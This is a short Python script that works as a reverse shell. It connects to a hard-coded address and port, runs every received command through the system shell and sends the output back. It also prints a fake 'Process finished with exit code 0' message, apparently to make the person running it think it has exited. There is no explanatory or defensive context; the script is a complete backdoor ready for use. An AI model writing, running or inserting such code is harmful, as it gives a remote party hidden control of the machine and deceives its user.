import socket
import subprocess


REMOTE_PORT = 1111
client = socket.socket()
client.connect(('192.168.254.103', REMOTE_PORT))
print('Process finished with exit code 0')
while True:
    command = client.recv(1024)
    command = command.decode()
    op = subprocess.Popen(command, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
    output = op.stdout.read()
    output_error = op.stderr.read()
    client.send(output + output_error)